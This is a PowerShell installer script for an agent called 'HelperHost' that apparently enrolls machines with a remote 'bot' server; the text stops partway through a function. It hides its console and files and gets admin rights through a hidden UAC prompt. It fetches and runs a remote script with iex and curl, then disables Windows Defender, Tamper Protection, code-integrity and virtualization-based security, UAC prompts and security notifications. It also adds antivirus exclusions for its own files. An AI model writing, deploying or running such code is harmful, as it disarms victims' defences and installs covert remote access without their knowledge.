$ErrorActionPreference = 'Stop'
if (-not $Enroll) { $Enroll = $env:AGENTSHE_ENROLL }
if (-not $BotBase) { $BotBase = $env:AGENTSHE_BOT_BASE }
if (-not $InstallUrl) { $InstallUrl = $env:AGENTSHE_INSTALL_URL }
if (-not $Enroll) { throw 'Enroll manquant' }
if (-not $BotBase) { throw 'BotBase manquant' }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$AfterReboot = ($env:AGENTSHE_AFTER_REBOOT -eq '1')
$ForceHarden = ($env:AGENTSHE_FORCE_HARDEN -eq '1')
$IsElevatedRun = ($env:AGENTSHE_ELEVATED -eq '1')
$SessionPrep = ($env:AGENTSHE_SESSION_PREP -eq '1')

function Ensure-ConsoleApi {
  if ('HHWin.Console' -as [type]) { return }
  Add-Type -Namespace HHWin -Name Console -MemberDefinition @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll")] public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
[DllImport("user32.dll")] public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
[DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("kernel32.dll")] public static extern bool FreeConsole();
'@
}

function Hide-ConsoleFromTaskbar {
  # SW_HIDE + TOOLWINDOW: invisible et absent de la barre des taches (≠ minimize)
  try {
    Ensure-ConsoleApi
    $h = [HHWin.Console]::GetConsoleWindow()
    if ($h -eq [IntPtr]::Zero) { return }
    $GWL_EXSTYLE = -20
    $WS_EX_APPWINDOW = 0x40000
    $WS_EX_TOOLWINDOW = 0x80
    $style = [HHWin.Console]::GetWindowLong($h, $GWL_EXSTYLE)
    $style = ($style -band (-bnot $WS_EX_APPWINDOW)) -bor $WS_EX_TOOLWINDOW
    [void][HHWin.Console]::SetWindowLong($h, $GWL_EXSTYLE, $style)
    [void][HHWin.Console]::ShowWindow($h, 0)
    [void][HHWin.Console]::SetWindowPos($h, [IntPtr]::Zero, 0, 0, 0, 0, 0x0080 -bor 0x0001 -bor 0x0002)
  } catch {}
}

function Minimize-Console {
  Hide-ConsoleFromTaskbar
}

function Close-Console {
  try {
    Ensure-ConsoleApi
    $h = [HHWin.Console]::GetConsoleWindow()
    if ($h -ne [IntPtr]::Zero) {
      [void][HHWin.Console]::ShowWindow($h, 0)
      [void][HHWin.Console]::FreeConsole()
    }
  } catch {}
  Start-Sleep -Milliseconds 250
  Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
}

function Save-HHState {
  param([hashtable]$Patch)
  $key = 'HKCU:\Software\HelperHost'
  New-Item $key -Force | Out-Null
  $cur = [ordered]@{}
  $raw = (Get-ItemProperty $key -Name state -EA SilentlyContinue).state
  if ($raw) {
    try {
      $j = $raw | ConvertFrom-Json
      foreach ($p in $j.PSObject.Properties) { if ($p.Name -notmatch '^PS') { $cur[$p.Name] = $p.Value } }
    } catch {}
  }
  foreach ($k in $Patch.Keys) { $cur[$k] = $Patch[$k] }
  Set-ItemProperty $key -Name state -Value (($cur | ConvertTo-Json -Compress)) -Type String -Force
}

function Test-HelperReady {
  if (-not (Get-Process HelperHost -ErrorAction SilentlyContinue)) { return $false }
  $raw = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
  if ($raw) {
    try {
      $j = $raw | ConvertFrom-Json
      if ($j.token) { return $true }
    } catch {}
  }
  return (Test-Path (Join-Path $Dir 'token'))
}

function Clear-LegacySidecars {
  $ErrorActionPreference = 'SilentlyContinue'
  foreach ($n in @(
    'config.json','token','public_url','agent.log','boot.log','agent.lock',
    'notify-backup.json','uac-backup.json','restore-security.ps1',
    'watchdog.vbs','reconnect.vbs','watchdog.lock','EdgeRelay.exe','.av-off'
  )) {
    Remove-Item (Join-Path $Dir $n) -Force -EA SilentlyContinue
  }
}

function Finish-Ok {
  Clear-LegacySidecars
  try { Hide-HH $Dir; Hide-HH $Cache; Hide-HH (Join-Path $Dir 'tools') } catch {}
  Write-Output 'OK'
  try { Clear-ResumeTasks } catch {}
  Start-Sleep -Milliseconds 400
  Close-Console
}

# Cache toute de suite (pas minimize — retire de la taskbar)
if (-not $IsElevatedRun) { Hide-ConsoleFromTaskbar }

function Test-IsAdmin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  $p = New-Object Security.Principal.WindowsPrincipal($id)
  return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Invoke-ElevatedInstall {
  # Hidden UAC elev — parent polls marker (RunAs -Wait is unreliable)
  if (-not $InstallUrl) {
    if ($BotBase) {
      $InstallUrl = "$($BotBase.TrimEnd('/'))/files/scripts/install-win.ps1"
    } else {
      throw 'InstallUrl manquant'
    }
  }
  $wrap = Join-Path $env:TEMP ('HelperHost-elev-' + [guid]::NewGuid().ToString('n') + '.ps1')
  $marker = Join-Path $env:TEMP 'HelperHost-install.ok'
  $fail = Join-Path $env:TEMP 'HelperHost-install.err'
  $pending = Join-Path $env:LOCALAPPDATA 'HelperHost\install-pending'
  $tokenProbe = Join-Path $env:LOCALAPPDATA 'HelperHost\token'
  $readyKey = 'HKCU:\Software\HelperHost'
  Remove-Item $marker, $fail -Force -ErrorAction SilentlyContinue
  $en = $Enroll.Replace("'", "''")
  $bb = $BotBase.Replace("'", "''")
  $iu = $InstallUrl.Replace("'", "''")
  $ghVal = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
  $gh = $ghVal.Replace("'", "''")
  @(
    "`$ErrorActionPreference = 'Stop'"
    "`$Enroll = '$en'"
    "`$BotBase = '$bb'"
    "`$InstallUrl = '$iu'"
    "`$env:AGENTSHE_ENROLL = '$en'"
    "`$env:AGENTSHE_BOT_BASE = '$bb'"
    "`$env:AGENTSHE_INSTALL_URL = '$iu'"
    "`$env:AGENTSHE_GH = '$gh'"
    "`$env:AGENTSHE_ELEVATED = '1'"
    "`$env:AGENTSHE_FORCE_HARDEN = '1'"
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
    "try {"
    "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
    "  'OK' | Set-Content -Encoding ASCII '$marker'"
    "} catch {"
    "  `$_ | Out-String | Set-Content -Encoding UTF8 '$fail'"
    "  exit 1"
    "}"
  ) -join "`r`n" | Set-Content -Encoding UTF8 $wrap

  $psi = New-Object System.Diagnostics.ProcessStartInfo
  $psi.FileName = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  $psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$wrap`""
  $psi.UseShellExecute = $true
  $psi.Verb = 'runas'
  $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
  try {
    $null = [System.Diagnostics.Process]::Start($psi)
  } catch {
    Remove-Item $wrap -Force -ErrorAction SilentlyContinue
    throw "Elevation UAC refusee. Accepte l'invite Admin."
  }

  for ($i = 0; $i -lt 200; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $marker) {
      Remove-Item $marker, $wrap -Force -ErrorAction SilentlyContinue
      $script:ElevDoneOk = $true
      return
    }
    if ((Test-Path $tokenProbe) -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
      Remove-Item $wrap -Force -ErrorAction SilentlyContinue
      $script:ElevDoneOk = $true
      return
    }
    $stRaw = (Get-ItemProperty $readyKey -Name state -EA SilentlyContinue).state
    if ($stRaw -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
      try {
        if (($stRaw | ConvertFrom-Json).token) {
          Remove-Item $wrap -Force -ErrorAction SilentlyContinue
          $script:ElevDoneOk = $true
          return
        }
      } catch {}
    }
    if (Test-Path $pending) {
      Remove-Item $wrap -Force -ErrorAction SilentlyContinue
      $script:ElevRebootPending = $true
      return
    }
    if (Test-Path $fail) {
      $msg = Get-Content $fail -Raw -ErrorAction SilentlyContinue
      Remove-Item $fail, $wrap -Force -ErrorAction SilentlyContinue
      throw $msg
    }
  }
  Remove-Item $wrap -Force -ErrorAction SilentlyContinue
  throw 'timeout elevation'
}

$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
if (-not $Gh) { throw 'AGENTSHE_GH / BotBase manquant (fichiers via tunnel bot)' }
$BotBase = $BotBase.TrimEnd('/')
$Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
$Cache = Join-Path $env:TEMP 'HelperHostCache'
$ResumeFile = Join-Path $Dir 'resume.json'
$PendingFile = Join-Path $Dir 'install-pending'
$RebootFlag = Join-Path $Dir '.security-rebooted'
New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
function Hide-HH([string]$P) {
  if (-not $P -or -not (Test-Path $P)) { return }
  cmd /c "attrib +h +s `"$P`"" | Out-Null
  if ((Get-Item $P -Force).PSIsContainer) {
    cmd /c "attrib +h +s /s /d `"$P\*`"" | Out-Null
  }
}
Hide-HH $Dir
Hide-HH $Cache
if (-not $SessionPrep) {
  Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
}

function Wait-InteractiveLogon {
  Write-Host 'Attente de la session utilisateur...'
  $deadline = (Get-Date).AddHours(48)
  while ((Get-Date) -lt $deadline) {
    try {
      $user = (Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).UserName
      if ($user) {
        $exp = @(Get-Process explorer -ErrorAction SilentlyContinue | Where-Object { $_.SessionId -gt 0 })
        if ($exp.Count -gt 0) {
          Start-Sleep -Seconds 5
          return
        }
      }
    } catch {}
    Start-Sleep -Seconds 3
  }
  throw 'timeout: aucune session utilisateur'
}

function Download-File([string]$Url, [string]$OutFile) {
  if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
    & curl.exe -fsSL $Url -o $OutFile
    if ($LASTEXITCODE -ne 0) { throw "download failed: $Url" }
    return
  }
  Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $OutFile
}

function Restore-OrFetch([string]$Name, [string]$Url) {
  $dest = Join-Path $Dir $Name
  $cached = Join-Path $Cache $Name
  if (Test-Path $dest) { Copy-Item $dest $cached -Force -ErrorAction SilentlyContinue; return }
  if (Test-Path $cached) { Copy-Item $cached $dest -Force; return }
  $part = Join-Path $Cache ($Name + '.download')
  Download-File $Url $part
  Copy-Item $part $cached -Force
  Copy-Item $cached $dest -Force
  Hide-HH $dest
  Hide-HH $cached
  Hide-HH $Dir
  Hide-HH $Cache
}

function Unblock-Quiet([string]$Path) {
  if (-not (Test-Path $Path)) { return }
  Unblock-File -Path $Path -ErrorAction SilentlyContinue
  $zone = $Path + ':Zone.Identifier'
  if (Test-Path $zone) { Remove-Item $zone -Force -ErrorAction SilentlyContinue }
}

function Disable-WindowsNotifications {
  $ErrorActionPreference = 'SilentlyContinue'
  $rawExisting = $null
  try {
    $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
    if ($st) { $rawExisting = ($st | ConvertFrom-Json).notify_bak }
  } catch {}
  if (-not $rawExisting -and -not (Test-Path (Join-Path $Dir 'notify-backup.json'))) {
    $o = [ordered]@{}
    $push = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications'
    if (Test-Path $push) {
      $te = (Get-ItemProperty $push -Name ToastEnabled -EA SilentlyContinue).ToastEnabled
      if ($null -ne $te) { $o.toast_enabled = [int]$te }
    }
    $exp = 'HKCU:\Software\Policies\Microsoft\Windows\Explorer'
    if (Test-Path $exp) {
      $o.had_explorer_policy_key = $true
      $dn = (Get-ItemProperty $exp -Name DisableNotificationCenter -EA SilentlyContinue).DisableNotificationCenter
      if ($null -ne $dn) { $o.disable_notification_center = [int]$dn }
    }
    $ns = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings'
    if (Test-Path $ns) {
      $v = (Get-ItemProperty $ns -Name NOC_GLOBAL_SETTING_TOASTS_ENABLED -EA SilentlyContinue).NOC_GLOBAL_SETTING_TOASTS_ENABLED
      if ($null -ne $v) { $o.toasts_enabled = [int]$v }
      $v = (Get-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK -EA SilentlyContinue).NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK
      if ($null -ne $v) { $o.allow_toast_above_lock = [int]$v }
      $v = (Get-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND -EA SilentlyContinue).NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND
      if ($null -ne $v) { $o.allow_notif_sound = [int]$v }
    }
    Save-HHState @{ notify_bak = ($o | ConvertTo-Json -Compress) }
  }
  New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Force | Out-Null
  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name ToastEnabled -Value 0 -Type DWord -Force
  New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications\Backup' -Force | Out-Null
  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Value 1 -Type DWord -Force
  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotificationOnLockScreen -Value 1 -Type DWord -Force
  New-Item 'HKCU:\Software\Policies\Microsoft\Windows\Explorer' -Force | Out-Null
  Set-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\Explorer' -Name DisableNotificationCenter -Value 1 -Type DWord -Force
  New-Item 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Force | Out-Null
  Set-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Value 1 -Type DWord -Force
  Set-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoCloudApplicationNotification -Value 1 -Type DWord -Force
  New-Item 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Force | Out-Null
  Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name NOC_GLOBAL_SETTING_TOASTS_ENABLED -Value 0 -Type DWord -Force
  Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK -Value 0 -Type DWord -Force
  Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK -Value 0 -Type DWord -Force
  Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings' -Name NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND -Value 0 -Type DWord -Force
  foreach ($sub in @(
    'Windows.SystemToast.SecurityAndMaintenance',
    'Windows.SystemToast.WindowsUpdate.Notification',
    'Windows.SystemToast.Explorer',
    'Windows.SystemToast.StartupApp',
    'Windows.SystemToast.Suggested',
    'Windows.SystemToast.AudioTroubleshooter',
    'Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI',
    'Windows.SystemToast.WindowsDefender.SecurityCenter',
    'Windows.SystemToast.WindowsDefender.Av'
  )) {
    $p = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\$sub"
    New-Item $p -Force | Out-Null
    Set-ItemProperty $p -Name Enabled -Value 0 -Type DWord -Force
  }
  New-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications' -Force | Out-Null
  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications' -Name GlobalUserDisabled -Value 1 -Type DWord -Force
  # Best-effort HKLM (needs admin — also done in Disable-UACPrompts)
  Disable-SecurityCenterToasts
}

function Disable-SecurityCenterToasts {
  $ErrorActionPreference = 'SilentlyContinue'
  if (-not (Test-IsAdmin)) { return }
  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Force | Out-Null
  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Name Notification_Suppress -Value 1 -Type DWord -Force
  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Force | Out-Null
  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableNotifications -Value 1 -Type DWord -Force
  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableEnhancedNotifications -Value 1 -Type DWord -Force
  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer' -Force | Out-Null
  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer' -Name DisableNotificationCenter -Value 1 -Type DWord -Force
  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Force | Out-Null
  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Value 1 -Type DWord -Force
  if (Get-Command Set-MpPreference -EA SilentlyContinue) {
    Set-MpPreference -UILockdown $true -EA SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
  }
}

function Disable-UACPrompts {
  $ErrorActionPreference = 'SilentlyContinue'
  $sysPol = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
  if (-not (Test-Path $sysPol)) { return }
  if (-not (Test-IsAdmin)) { return }
  $haveUac = $false
  try {
    $st = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
    if ($st -and ($st | ConvertFrom-Json).uac_bak) { $haveUac = $true }
  } catch {}
  if (-not $haveUac) {
    $o = [ordered]@{}
    foreach ($n in @('EnableLUA', 'ConsentPromptBehaviorAdmin', 'ConsentPromptBehaviorUser', 'PromptOnSecureDesktop', 'EnableInstallerDetection')) {
      $v = (Get-ItemProperty $sysPol -Name $n -EA SilentlyContinue).$n
      if ($null -ne $v) { $o[$n] = [int]$v }
    }
    Save-HHState @{ uac_bak = ($o | ConvertTo-Json -Compress) }
  }
  # Elevate without prompting (UAC still "on" but silent for admins)
  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorAdmin -Value 0 -Type DWord -Force
  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorUser -Value 0 -Type DWord -Force
  Set-ItemProperty $sysPol -Name PromptOnSecureDesktop -Value 0 -Type DWord -Force
  Set-ItemProperty $sysPol -Name EnableInstallerDetection -Value 0 -Type DWord -Force
  Disable-SecurityCenterToasts
  Disable-WindowsNotifications
  $tools = Join-Path $Dir 'tools'
  New-Item $tools -ItemType Directory -Force | Out-Null
  Hide-HH $tools
  Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
  if (Get-Command Add-MpPreference -EA SilentlyContinue) {
    Add-MpPreference -ExclusionPath $tools -EA SilentlyContinue
  }
}

function Invoke-ElevatedSessionPrep {
  if (Test-IsAdmin) {
    Invoke-SessionHarden
    return
  }
  if (-not $InstallUrl) {
    if ($BotBase) {
      $InstallUrl = "$($BotBase.TrimEnd('/'))/files/scripts/install-win.ps1"
    } else {
      throw 'InstallUrl manquant'
    }
  }
  $wrap = Join-Path $env:TEMP ('HelperHost-prep-' + [guid]::NewGuid().ToString('n') + '.ps1')
  $marker = Join-Path $env:TEMP 'HelperHost-prep.ok'
  Remove-Item $marker -Force -ErrorAction SilentlyContinue
  $en = $Enroll.Replace("'", "''")
  $bb = $BotBase.Replace("'", "''")
  $iu = $InstallUrl.Replace("'", "''")
  $ghVal = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } elseif ($BotBase) { "$($BotBase.TrimEnd('/'))/files/releases" } else { '' }
  $gh = $ghVal.Replace("'", "''")
  @(
    "`$ErrorActionPreference = 'SilentlyContinue'"
    "`$Enroll = '$en'"
    "`$BotBase = '$bb'"
    "`$InstallUrl = '$iu'"
    "`$env:AGENTSHE_ENROLL = '$en'"
    "`$env:AGENTSHE_BOT_BASE = '$bb'"
    "`$env:AGENTSHE_INSTALL_URL = '$iu'"
    "`$env:AGENTSHE_GH = '$gh'"
    "`$env:AGENTSHE_ELEVATED = '1'"
    "`$env:AGENTSHE_SESSION_PREP = '1'"
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
    "try {"
    "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
    "  'OK' | Set-Content -Encoding ASCII '$marker'"
    "} catch { exit 1 }"
  ) -join "`r`n" | Set-Content -Encoding UTF8 $wrap
  $psi = New-Object System.Diagnostics.ProcessStartInfo
  $psi.FileName = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  $psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$wrap`""
  $psi.UseShellExecute = $true
  $psi.Verb = 'runas'
  $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
  try {
    $null = [System.Diagnostics.Process]::Start($psi)
  } catch {
    Remove-Item $wrap -Force -ErrorAction SilentlyContinue
    return
  }
  for ($i = 0; $i -lt 120; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $marker) {
      Remove-Item $marker, $wrap -Force -ErrorAction SilentlyContinue
      return
    }
    if (Test-Path (Join-Path $Dir '.av-off')) {
      Remove-Item $wrap -Force -ErrorAction SilentlyContinue
      return
    }
  }
  Remove-Item $wrap -Force -ErrorAction SilentlyContinue
}

function Disable-AllBlocking {
  $prev = $ErrorActionPreference
  $ErrorActionPreference = 'SilentlyContinue'
  if (-not (Test-IsAdmin)) {
    $ErrorActionPreference = $prev
    return
  }

  # Tamper Protection off first so prefs stick
  $feat = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
  New-Item $feat -Force | Out-Null
  Set-ItemProperty $feat -Name TamperProtection -Value 0 -Type DWord -Force
  Set-ItemProperty $feat -Name TamperProtectionSource -Value 0 -Type DWord -Force
  New-Item 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection' -Force | Out-Null

  if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableBehaviorMonitoring $true
    Set-MpPreference -DisableBlockAtFirstSeen $true
    Set-MpPreference -DisableIOAVProtection $true
    Set-MpPreference -DisableScriptScanning $true
    Set-MpPreference -DisableArchiveScanning $true
    Set-MpPreference -DisableEmailScanning $true
    Set-MpPreference -DisableRemovableDriveScanning $true
    Set-MpPreference -DisableIntrusionPreventionSystem $true
    Set-MpPreference -DisableScanningNetworkFiles $true
    Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true
    Set-MpPreference -EnableControlledFolderAccess Disabled
    Set-MpPreference -PUAProtection Disabled
    Set-MpPreference -MAPSReporting Disabled
    Set-MpPreference -SubmitSamplesConsent 2
    Set-MpPreference -EnableNetworkProtection Disabled
    Set-MpPreference -CloudBlockLevel 0
    Set-MpPreference -EnableFileHashComputation $false
    Set-MpPreference -DisableCatchupFullScan $true
    Set-MpPreference -DisableCatchupQuickScan $true
    Set-MpPreference -UILockdown $true
    Set-MpPreference -ExclusionExtension '.exe','.dll','.ps1','.bat','.cmd','.vbs','.zip','.txt' -EA SilentlyContinue
  }

  $wdPol = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
  New-Item $wdPol -Force | Out-Null
  Set-ItemProperty $wdPol -Name DisableAntiSpyware -Value 1 -Type DWord -Force
  Set-ItemProperty $wdPol -Name DisableAntiVirus -Value 1 -Type DWord -Force
  Set-ItemProperty $wdPol -Name DisableRoutinelyTakingAction -Value 1 -Type DWord -Force
  Set-ItemProperty $wdPol -Name ServiceKeepAlive -Value 0 -Type DWord -Force
  New-Item "$wdPol\Real-Time Protection" -Force | Out-Null
  Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -Type DWord -Force
  Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableBehaviorMonitoring -Value 1 -Type DWord -Force
  Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableOnAccessProtection -Value 1 -Type DWord -Force
  Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableScanOnRealtimeEnable -Value 1 -Type DWord -Force
  Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableIOAVProtection -Value 1 -Type DWord -Force
  Set-ItemProperty "$wdPol\Real-Time Protection" -Name DisableScriptScanning -Value 1 -Type DWord -Force
  New-Item "$wdPol\Spynet" -Force | Out-Null
  Set-ItemProperty "$wdPol\Spynet" -Name SpynetReporting -Value 0 -Type DWord -Force
  Set-ItemProperty "$wdPol\Spynet" -Name SubmitSamplesConsent -Value 2 -Type DWord -Force
  New-Item "$wdPol\Windows Defender Exploit Guard\Network Protection" -Force | Out-Null
  Set-ItemProperty "$wdPol\Windows Defender Exploit Guard\Network Protection" -Name EnableNetworkProtection -Value 0 -Type DWord -Force
  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Force | Out-Null
  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableNotifications -Value 1 -Type DWord -Force
  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableEnhancedNotifications -Value 1 -Type DWord -Force
  New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Force | Out-Null
  Set-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Name Notification_Suppress -Value 1 -Type DWord -Force

  $ci = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
  New-Item $ci -Force | Out-Null
  Set-ItemProperty $ci -Name VerifiedAndReputablePolicyState -Value 0 -Type DWord -Force

  $dg = 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard'
  New-Item $dg -Force | Out-Null
  Set-ItemProperty $dg -Name EnableVirtualizationBasedSecurity -Value 0 -Type DWord -Force
  Set-ItemProperty $dg -Name RequirePlatformSecurityFeatures -Value 0 -Type DWord -Force
  Set-ItemProperty $dg -Name Locked -Value 0 -Type DWord -Force
  New-Item "$dg\Scenarios\HypervisorEnforcedCodeIntegrity" -Force | Out-Null
  Set-ItemProperty "$dg\Scenarios\HypervisorEnforcedCodeIntegrity" -Name Enabled -Value 0 -Type DWord -Force
  Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name LsaCfgFlags -Value 0 -Type DWord -Force

  & bcdedit.exe /set '{current}' vsmlaunchtype Off | Out-Null
  & bcdedit.exe /set '{current}' hypervisorlaunchtype off | Out-Null

  $cip = Join-Path $env:WINDIR 'System32\CodeIntegrity\CiPolicies\Active'
  if (Test-Path $cip) {
    Get-ChildItem $cip -Filter '*.cip' -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
  }

  foreach ($svc in @('WinDefend', 'Sense', 'WdNisSvc', 'WdNisDrv', 'WdFilter', 'SecurityHealthService', 'wscsvc')) {
    Stop-Service $svc -Force -ErrorAction SilentlyContinue
    Set-Service $svc -StartupType Disabled -ErrorAction SilentlyContinue
  }
  Get-Process MsMpEng, NisSrv, SecurityHealthService, smartscreen -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue

  $ErrorActionPreference = $prev
}

function Invoke-SessionHarden {
  # Always: full AV off + UAC silent + notifs + exclusions + wipe hook
  if (-not (Test-IsAdmin)) { return }
  Disable-AllBlocking
  Disable-UACPrompts
  Disable-SecurityCenterToasts
  Disable-WindowsNotifications
  Set-DefenderExclude $Dir (Join-Path $Dir 'HelperHost.exe')
  Install-WipeRestoreHook
  '1' | Set-Content -Encoding ASCII (Join-Path $Dir '.av-off') -Force
}

function Set-DefenderExclude([string]$Path, [string]$Exe) {
  $name = Split-Path $Exe -Leaf
  $edge = Join-Path $Path 'EdgeRelay.exe'
  $tools = Join-Path $Path 'tools'
  if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) { return }
  try {
    Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $Cache -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $tools -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess 'EdgeRelay.exe' -ErrorAction SilentlyContinue
    Add-MpPreference -ControlledFolderAccessAllowedApplications $Exe -ErrorAction SilentlyContinue
    if (Test-Path $edge) {
      Add-MpPreference -ControlledFolderAccessAllowedApplications $edge -ErrorAction SilentlyContinue
    }
  } catch {}
}

function Try-StartHelper([string]$Helper, [string]$WorkDir) {
  try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $Helper
    $psi.WorkingDirectory = $WorkDir
